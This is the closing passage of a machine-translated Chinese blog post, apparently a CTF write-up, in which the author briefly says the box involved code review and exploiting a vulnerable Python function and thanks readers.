translated">这真的很有趣，box进行了大量的代码审查，并利用了代码中易受攻击的函数。它相当python化，但是我们不都喜欢用python做任何事情吗？:)老实说，做淫秽盒子真的是一次有趣的旅程。</p><p id="a8ea" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">希望你喜欢我的文章，感谢你的阅读！</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi pm"><img src="../Images/9113fe543c9439651bddeac55b3086e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*tPFb2C1Au5yIUYIE.png"/></div></div></figure></div></div>    
</body>
</html>